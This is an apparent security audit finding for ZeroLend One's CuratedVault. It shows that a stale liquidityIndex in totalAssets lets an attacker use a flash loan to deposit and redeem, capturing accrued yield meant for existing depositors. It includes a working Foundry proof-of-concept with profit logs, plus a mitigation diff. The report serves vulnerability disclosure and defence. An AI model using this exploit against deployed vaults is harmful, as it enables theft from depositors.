Careful Fleece Pike

High

# An attacker can hijack the `CuratedVault`'s matured yield

### Summary

`CuratedVault#totalAssets` does not update pool's `liquidityIndex` at the beginning will cause the matured yield to be distributed to users that do not supply to the vault before the yield accrues. An attacker can exploit this to hijack the `CuratedVault`'s matured yield.

### Root Cause

`CuratedVault#totalAssets` does not update pool's `liquidityIndex` at the beginning

https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/vaults/CuratedVault.sol#L368-L372

```solidity
  function totalAssets() public view override returns (uint256 assets) {
    for (uint256 i; i < withdrawQueue.length; ++i) {
      assets += withdrawQueue[i].getBalanceByPosition(asset(), positionId);
    }
  }
```

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

Let's have:
- A vault has a total assets of `totalAssets`
- `X` amount of yield is accrued from `T1` to `T2`

1. The attacker takes a flash loan of `flashLoanAmount`
2. The attacker deposits `flashLoanAmount` at `T2` to the vault. Since `CuratedVault#totalAssets` does not update pool's `liquidityIndex`, the minted shares are calculated based on the total assets at `T1`.
3. The attacker redeems all the shares and benefits from `X` amount of yield.
4. The attacker repays the flash loan.

The cost of this attack is gas fee and flash loan fee.

### Impact

The attacker hijacks `flashLoanAmount / (flashLoanAmount + totalAssets)` percentage of `X` amount of yield.

`X` could be a considerable amount when:
- The pool has high interest rate.
- `T2 - T1` is large. This is the case for the pool with low interactions.

When `X` is a considerable amount, the amount of hijacked funds could be greater than the cost of the attack, then the attacker will benefit from the attack.

### PoC

Due to a bug in `PositionBalanceConfiguration#getSupplyBalance` that we submitted in a different issue, fix the `getSupplyBalance` function before running the PoC

`core/pool/configuration/PositionBalanceConfiguration.sol`

```diff
library PositionBalanceConfiguration {
  function getSupplyBalance(DataTypes.PositionBalance storage self, uint256 index) public view returns (uint256 supply) {
-   uint256 increase = self.supplyShares.rayMul(index) - self.supplyShares.rayMul(self.lastSupplyLiquidtyIndex);
-   return self.supplyShares + increase;
+   return self.supplyShares.rayMul(index);
  }
}
```

Run command: `forge test --match-path test/PoC/PoC.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from 'lib/forge-std/src/Test.sol';
import '../forge/core/vaults/helpers/IntegrationVaultTest.sol';

contract ERC4626Test is IntegrationVaultTest {
  address attacker = makeAddr('attacker');

  function setUp() public {
    _setUpVault();
    _setCap(allMarkets[0], CAP);
    _sortSupplyQueueIdleLast();

    oracleB.updateRoundTimestamp();
    oracle.updateRoundTimestamp();

    uint256 vaultAssets = 10 ether;

    loanToken.mint(supplier, vaultAssets);
    vm.prank(supplier);
    vault.deposit(vaultAssets, supplier);
    
    vm.prank(attacker);
    loanToken.approve(address(vault), type(uint256).max);
  }

  function testDeposit() public {
    collateralToken.mint(borrower, type(uint128).max);

    vm.startPrank(borrower);
    allMarkets[0].supplySimple(address(collateralToken), borrower, type(uint128).max, 0);
    allMarkets[0].borrowSimple(address(loanToken), borrower, 8 ether, 0);

    skip(100 days);

    oracleB.updateRoundTimestamp();
    oracle.updateRoundTimestamp();

    uint256 vaultAssetsBefore = vault.totalAssets();

    console.log("Vault's assets before updating reserve: %e", vaultAssetsBefore);

    uint256 snapshot = vm.snapshot();

    allMarkets[0].forceUpdateReserve(address(loanToken));
    console.log("Vault's accrued yield: %e", vault.totalAssets() - vaultAssetsBefore);

    vm.revertTo(snapshot);

    uint256 flashLoanAmount = 100 ether;

    loanToken.mint(attacker, flashLoanAmount);

    vm.startPrank(attacker);
    uint256 shares = vault.deposit(flashLoanAmount, attacker);
    vault.redeem(shares, attacker, attacker);
    vm.stopPrank();

    console.log("Attacker's profit: %e", loanToken.balanceOf(attacker) - flashLoanAmount);
  }
}
```

Logs:

```bash
  Vault's assets before updating reserve: 1e19
  Vault's accrued yield: 5.62832773326440941e17
  Attacker's profit: 5.11666157569491763e17
```

Although the yield accrued, the vault's assets before updating reserve is still `1e19`.

### Mitigation

Update pool's `liquidityIndex` at the beginning of `CuratedVault#totalAssets` 

```diff
  function totalAssets() public view override returns (uint256 assets) {
    for (uint256 i; i < withdrawQueue.length; ++i) {
+     withdrawQueue[i].forceUpdateReserve(asset());
      assets += withdrawQueue[i].getBalanceByPosition(asset(), positionId);
    }
  }
```